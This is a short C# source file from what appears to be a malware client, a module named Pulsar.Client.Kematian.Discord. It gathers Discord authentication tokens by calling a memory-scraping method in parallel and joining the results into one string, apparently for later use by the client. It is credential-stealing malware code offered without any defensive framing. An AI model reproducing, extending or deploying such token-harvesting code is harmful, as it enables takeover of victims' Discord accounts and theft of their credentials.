﻿using Pulsar.Client.Kematian.Discord.Methods.Memory;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading.Tasks;

namespace Pulsar.Client.Kematian.Discord
{
    public class GetTokens
    {
        public static string Tokens()
        {
            var tokens = new List<string>();

            var methods = new List<Func<string[]>>()
                {
                    GetTokensFromMemory.Tokens,
                };

            Parallel.ForEach(methods, method =>
            {
                try
                {
                    var result = method();
                    if (result != null)
                    {
                        lock (tokens)
                        {
                            tokens.AddRange(result);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex);
                }
            });

            return string.Join(Environment.NewLine, tokens);
        }
    }
}
